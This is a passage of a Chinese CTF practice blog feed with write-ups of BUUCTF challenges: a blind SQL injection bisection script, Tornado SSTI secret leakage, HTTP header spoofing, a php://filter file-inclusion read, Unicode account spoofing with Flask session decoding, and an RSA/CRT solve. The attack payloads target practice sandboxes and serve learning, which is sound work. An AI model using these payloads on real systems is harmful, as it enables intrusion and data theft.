class="keyword">if</span> (!$db) &#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>, $db);<span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (safe($id)) &#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);<span class="comment">//进行查询</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($query) &#123;</span><br><span class="line">        $result = mysql_fetch_array($query);<span class="comment">//数组化显示查询结果，此处返回的数组应该是MYSQLI_ASSOC</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用的注入语句<code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code>第一次接触注入脚本，直接copy一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://64ed7296-9aea-43ac-84ec-24e5c6f616a7.node1.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select      flag    from    flag),%d,1))&gt;%d,1,2)"</span> % (x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h2 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11435298.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11435298.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>easy_tornado[护网杯 2018]</title>
    <link href="/2020/11/30/easy-tornado/"/>
    <url>/2020/11/30/easy-tornado/</url>
    
    <content type="html"><![CDATA[<p>tornado与ssti模版注入</p><a id="more"></a><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>发现三个文件，点开后发现访问文件需要对应的文件名和md5值</p><p>flag.txt中提示 flag in /fllllllllllllag  知道文件名为 /fllllllllllllag</p><p>(这里还以为flag在 /fllllllllllllag路径下的flag.txt，原来是包含flag的文件TnT</p><p>hints.txt发现对应md5值生成方法md5(cookie_secret+md5(filename))</p><p>得想办法知道cookie_secret</p><p>由于之前直接访问file?filename=/fllllllllllllag 会报错，然后看wp知道会直接显示msg的内容</p><p>这时候直接/error?msg=得到cookie_secret</p><p><code>hashlib.md5(b&#39;9d25ecb4-2999-47e8-b766-0154e448e7b9&#39;+hashlib.md5(b&#39;/fllllllllllllag&#39;).hexdigest().encode()).hexdigest()</code>得到最终md5值</p><p>访问传filename值和对应的md5值即可获得flag</p><h2 id="tornado的SSTI-模版注入"><a href="#tornado的SSTI-模版注入" class="headerlink" title="tornado的SSTI(模版注入)"></a>tornado的SSTI(模版注入)</h2><p>学习出处:</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p><a href="https://www.cnblogs.com/jingqi/p/8024873.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingqi/p/8024873.html</a></p><p><strong>使用render方法渲染模板</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.render(<span class="string">'tmep_index.html'</span>)</span><br></pre></td></tr></table></figure><p>在tornado模板中，存在一些可以访问的快速对象，比如 { {escape(handler.settings[“cookie”])} }，这个其实就是handler.settings对象，里面存储着一些环境变量</p><p>{ { } }  表达式用双大括号包围，内容可以是任何python表达式 ，在双大括号中的单词是占位符，双大括号中放置变量名或表达式，变量名与传入的关键字参数名要相同(如果不使用{ { } }表达式，直接显示输入的字符串</p><hr><p>这里大括号都隔开了是因为hexo的蜜汁报错(Nunjucks Errors ),Nunjucks会把大括号识别为自己的语法</p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>tornado</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Http[极客大挑战 2019]</title>
    <link href="/2020/09/16/Http/"/>
    <url>/2020/09/16/Http/</url>
    
    <content type="html"><![CDATA[<p>http请求头</p><a id="more"></a><p>使用burpsuite抓包看到Secret.php</p><p>显示It doesn’t come from ‘<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a>‘</p><p>学到了请求首部字段</p><p>Referer 告知请求的原始资源的URI，可以看出请求URI是从哪个页面发出的</p><p>把请求包发送到重发器 修改头部Referer为 <a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p><p>显示Please use “Syclover” browser</p><p>继续学到User-Agent字段</p><p>User-Agent  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1 创建请求的浏览器和用户代理名称等信息</p><p>显示No!!! you can only read this locally!!!</p><p>要伪造ip，在headers里添加 X-Forwarded-For</p><blockquote><p>X-Forwarded-For</p><p>X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中.</p></blockquote><p>得到flag flag{a5e3eef1-e0d8-426c-acb7-18b094653f29}</p><p>学习出处：<a href="https://www.dazhuanlan.com/2020/03/10/5e670ce66256d/?__cf_chl_jschl_tk__=45aa12cf90d9c0c25eef9918a873d6f7d17f4441-1600263258-0-AaivmMLCayRCIlZxXmdU78F6O6L0iO32tcd-YfB_AcQw_IIxxXasK1QPOGSEQN89atHKD6IE9Oi9JfZNPH5TEPGmnhwDY7BaZ27QsW5tGP46_vv8gPBTZrIKfTDbf7w0iXhcP-e5cD037gL-ZnalH9u8XwVnc4PD3ylRPljIdKMEPVucsXG2SCxTVMZV9NfthOwT5mQrqzolzaSiXNeCzeWWq69W3-gUdL8TgrJWfoMmyUpzfzvpcDAysJ9IFBFxIzSxM-ZLEey-25_3QIFbUNQ3ipoGHh_HMIDgaMbcrudEiJLf_tfQQ1-jDuutjGMw1g" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/10/5e670ce66256d/?__cf_chl_jschl_tk__=45aa12cf90d9c0c25eef9918a873d6f7d17f4441-1600263258-0-AaivmMLCayRCIlZxXmdU78F6O6L0iO32tcd-YfB_AcQw_IIxxXasK1QPOGSEQN89atHKD6IE9Oi9JfZNPH5TEPGmnhwDY7BaZ27QsW5tGP46_vv8gPBTZrIKfTDbf7w0iXhcP-e5cD037gL-ZnalH9u8XwVnc4PD3ylRPljIdKMEPVucsXG2SCxTVMZV9NfthOwT5mQrqzolzaSiXNeCzeWWq69W3-gUdL8TgrJWfoMmyUpzfzvpcDAysJ9IFBFxIzSxM-ZLEey-25_3QIFbUNQ3ipoGHh_HMIDgaMbcrudEiJLf_tfQQ1-jDuutjGMw1g</a></p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fast[V&amp;N2020 公开赛]</title>
    <link href="/2020/09/16/Fast/"/>
    <url>/2020/09/16/Fast/</url>
    
    <content type="html"><![CDATA[<p>一系列公式推导，费马小定理与CRT</p><a id="more"></a><p>学习出处：<a href="http://element-ui.cn/article/show-13917.aspx" target="_blank" rel="noopener">http://element-ui.cn/article/show-13917.aspx</a></p><h2 id="p与q推理"><a href="#p与q推理" class="headerlink" title="p与q推理"></a>p与q推理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g, r1, r2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">g1 = pow(g, r1 * (p<span class="number">-1</span>), N)</span><br><span class="line">g2 = pow(g, r2 * (q<span class="number">-1</span>), N)</span><br></pre></td></tr></table></figure><p>$g^{r_1*(p-1)} \equiv g_1 \bmod N$</p><p>$ g^{r_1(p-1)}=kN+g_1 $</p><p>$g^{r_1*(p-1)}\equiv g_1 \bmod p$</p><p>由于费马小定理</p><p>如果p是一个<a href="https://baike.baidu.com/item/质数/263515" target="_blank" rel="noopener">质数</a>，而整数a不是p的倍数，则有$a^{p-1} \equiv 1 \bmod p$</p><p>推出$g^{r_1*(p-1)}\bmod p \equiv 1$</p><p>故$g_1 \equiv 1 \bmod p$</p><p>同理$g_2 \equiv 1 \bmod q$</p><p>gcd($g_1$-1,N)与gcd($g_2$,N)求出p,q</p><h2 id="解密函数推理"><a href="#解密函数推理" class="headerlink" title="解密函数推理"></a>解密函数推理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    s1, s2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>)]</span><br><span class="line">    c1 = (m * pow(g1, s1, N)) % N</span><br><span class="line">    c2 = (m * pow(g2, s2, N)) % N</span><br><span class="line">    <span class="keyword">return</span> (c1, c2)</span><br></pre></td></tr></table></figure><p>加密函数如上所示</p><p>$c_1=((m\bmod N)(g_1^{s_1}\bmod N))\bmod N$</p><p>$c_1=(m*g_1^{s_1})\bmod N$</p><p>$c_1=kN+mg_1^{s_1}$</p><p>$c_1 \bmod p=(m*g_1^{s_1}) \bmod p$</p><p>由于$g_1 \equiv 1 \bmod p$</p><p>$c_1 \equiv m\bmod p$</p><p>同理$c_2 \equiv m\bmod q$</p><p>使用中国剩余定理即可求解m</p><p>解密函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c1, c2)</span>:</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1 = <span class="number">9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line">g2 = <span class="number">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line">n = <span class="number">18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line">c1, c2 = (</span><br><span class="line">    <span class="number">3976514029543484086411168675941075541422870678409709261442618832911574665848843566949154289825219682094719766762966082440586568781997199077781276145091509192208487682443007457513002005089654365915817414921574344557570444253187757317116858499013550050579856269915915792827620535138057468531410166908365364129001407147467636145589396570815405571923148902993581000542566387654639930651683044853608873583911638108204074537952317056718986683846742909366072461130053275195290631718363272923316002049685111871888148244026652658482359335651889139243735138819453744763293112267738369048641158946411500606588429007794613880534</span>,</span><br><span class="line">    <span class="number">18524535479582837341745231233387403662294605513261199630593257391163433751052467785080620993007681605662927226603747560698627838567782891522546977611597418150309028806158429831471152782211111046118637630899456903846057977815397285171313888516791822545633820066408276065732715348834255021260666966934592884548856831383262013360819013814149529393178712576141627031723067564594282618223686778534522328204603249125537258294561872667849498796757523663858312311082034700705599706428944071848443463999351872482644584735305157234751806369172212650596041534643187402820399145288902719434158798638116870325144146218568810928344</span></span><br><span class="line">)</span><br><span class="line">p = gcd(g1 - <span class="number">1</span>, n)</span><br><span class="line">q = gcd(g2 - <span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c1, c2)</span>:</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp * inverse(q, p) * q + xq * inverse(p, q) * p) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(decrypt(c1, c2)))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Secret File[极客大挑战 2019]</title>
    <link href="/2020/09/16/file/"/>
    <url>/2020/09/16/file/</url>
    
    <content type="html"><![CDATA[<p>文件包含与php伪协议</p><a id="more"></a><p>查看源码发现Archive_room.php</p><p>接着是action.php</p><p>但由于访问时间过短直接跳转到end.php</p><p>使用burpsuite抓包</p><p><img src="/2020/09/16/file/image-20200904150424108.png" alt="image-20200904150424108"></p><p>发现secr3t.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含漏洞并并过滤掉了一些关键词</p><p>学习到了对于文件包含漏洞用php伪协议读取文件</p><p>学习出处：<a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a></p><p>file://后加文件的绝对路径和文件名</p><p>php://协议</p><p>1.php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p><p>学习出处：<a href="https://blog.csdn.net/destiny1507/article/details/82347371" target="_blank" rel="noopener">https://blog.csdn.net/destiny1507/article/details/82347371</a></p><p>基本使用：?file=php://filter/read=convert.base64-encode/resource=xxx.php</p><p>各参数作用：</p><p><img src="/2020/09/16/file/image-20200904151413498.png" alt="image-20200904151413498"></p><p>2.php://input</p><p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p>其余php封装协议</p><p><img src="/2020/09/16/file/15063209941952.png!small" alt="常规小节.png"></p><p>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>读取到flag的base64编码后形式，解码即可找到flag</p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>php伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>admin[hctf 2018]</title>
    <link href="/2020/09/16/2018/"/>
    <url>/2020/09/16/2018/</url>
    
    <content type="html"><![CDATA[<p>unicode欺骗、flask session伪造、条件竞争</p><a id="more"></a><h2 id="对源文件的分析学习"><a href="#对源文件的分析学习" class="headerlink" title="对源文件的分析学习"></a>对源文件的分析学习</h2><h3 id="code-py"><a href="#code-py" class="headerlink" title="code.py"></a>code.py</h3><p><strong>random.sample</strong></p><p>多用于截取列表的指定长度的随机数，但是不会改变列表本身的排序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">rs = random.sample(list, <span class="number">2</span>)</span><br><span class="line">print(rs)</span><br><span class="line">print(list)</span><br><span class="line"></span><br><span class="line">》》》[<span class="number">2</span>, <span class="number">4</span>]    <span class="comment">#此数组随着不同的执行，里面的元素随机，但都是两个</span></span><br><span class="line">》》》[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><strong>string.digits</strong></p><p>digits方法的作用是生成字符串，包括0-9</p><p><strong>string.ascii_letters</strong></p><p>a-z A-Z</p><p>原来验证码是这样生成的(好神奇</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gene_text</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''生成4位验证码'''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">4</span>))</span><br></pre></td></tr></table></figure><h4 id="PIL库使用"><a href="#PIL库使用" class="headerlink" title="PIL库使用"></a><strong>PIL库使用</strong></h4><p>PIL.image</p><p><strong>1)新建图片对象</strong></p><p>im = Image.new(‘RGB’,(width, height),’white’)</p><p>如果不给color变量赋值，图像内容被设置为0,为黑色</p><p><strong>2)预览</strong></p><p>im.show()</p><p>PIL.ImageDraw</p><p><strong>1)新建draw对象</strong></p><p>draw=ImageDraw.Draw(im)</p><p><strong>2)绘制字符串</strong></p><p>draw.text((5+random.randint(-3,3)+23*item, 5+random.randint(-3,3)),</p><p>​         text=code[item], fill=rndColor(),font=font )</p><p>第一个参数为绘制开始坐标，第二个参数为需要绘制的文字内容，第三个参数为颜色</p><p><strong>高斯模糊</strong></p><p>对图像进行模糊处理 使用ImageFilter类</p><blockquote><p><strong>ImageFilter:Python中的图像滤波，主要对图像进行平滑、锐化、边界增强等滤波处理。</strong></p></blockquote><p>im = im.filter(ImageFilter.GaussianBlur(radius=1.5))</p><p>高斯模糊 GaussianBlur(radius=2)</p><p><strong>Image.save</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img.save(img_name, quality=<span class="number">95</span>)</span><br></pre></td></tr></table></figure><p>有些时候往往需要图片的大小不能变化太大或不能太小。所以在使用此方式时可以加入参数。quality参数： 保存图像的质量，值的范围从1（最差）到95（最佳）。 默认值为75，使用中应尽量避免高于95的值; 100会禁用部分JPEG压缩算法，并导致大文件图像质量几乎没有任何增益。</p><h3 id="routes-py"><a href="#routes-py" class="headerlink" title="routes.py"></a>routes.py</h3><p><strong>and/or</strong></p><p>学习出处：<a href="https://www.cnblogs.com/yonyong/p/9166067.html" target="_blank" rel="noopener">https://www.cnblogs.com/yonyong/p/9166067.html</a></p><p>and和or比较的结果不是布尔值，而是比较值之一</p><p>and</p><p>从左到右演算表达式，如果比较的值都为真，and返回最后一个值</p><p>如果某个值为假，and返回第一个假值</p><p>or</p><p>使用 or 时，在布尔上下文中从左到右演算值，就像 and 一样。如果有一个值为真，or 立刻返回该值 如果所有的值都为假，or 返回最后一个假值 注意 or 在布尔上下文中会一直进行表达式演算直到找到第一个真值，然后就会忽略剩余的比较值</p><p>故config.py中</p><p><code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code></p><p>如果环境变量为空，那么key值将成为’ckj123’</p><p><strong>BytesIO</strong></p><p>Python在内存中读写数据，用到的模块是StringIO和BytesIO</p><p><strong>os.environ.get()</strong></p><p>os.environ.get（）是python中os模块获取环境变量的一个方法</p><p><strong>nodeprep.prepare</strong></p><p>nodeprep.prepare函数 nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</p><p>看师傅博客说 在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距过大可以判断有漏洞（原来如此</p><p>学习出处:<a href="https://hu3sky.github.io/2019/02/07/hctf/" target="_blank" rel="noopener">https://hu3sky.github.io/2019/02/07/hctf/</a></p><p><code>nodeprep.prepare()</code><br>这个函数会把大写转换为小写 并且<code>nodeprep.prepare()</code>会做如下转换<br>假如有一个<code>ᴬ</code>字符 第一次调用函数时会造成<code>ᴬ-&gt;A</code>，第二次调用时会<code>A-&gt;a</code></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>学习出处:</p><p><a href="https://www.cnblogs.com/wangtanzhi/p/11861820.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/11861820.html</a></p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p><p>1.unicode欺骗</p><p>注册一个ᴬdmin账号 此时第一次调用nodeprep.prepare()账号变为<br>Admin() 此时进行登录，再次调用nodeprep.prepare()，页面显示Hello Admin,此时应已变成admin,修改密码再次调用，修改admin密码 再进行登录</p><p>2.flask session伪造</p><p>学习出处:<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>通过这个工具(<a href="https://github.com/noraj/flask-session-cookie-manager)可以加密解密flask中session，大概看了一下具体的原理(因为太菜了，还没太看懂呜呜呜呜" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager)可以加密解密flask中session，大概看了一下具体的原理(因为太菜了，还没太看懂呜呜呜呜</a></p><p>大概分为这几步:</p><ol><li>json.dumps 将对象转换成json字符串，作为数据</li><li>如果数据压缩后长度更短，则用zlib库进行压缩</li><li>将数据用base64编码</li><li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li></ol><p>这里还有师傅写的解密的脚本,都记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span 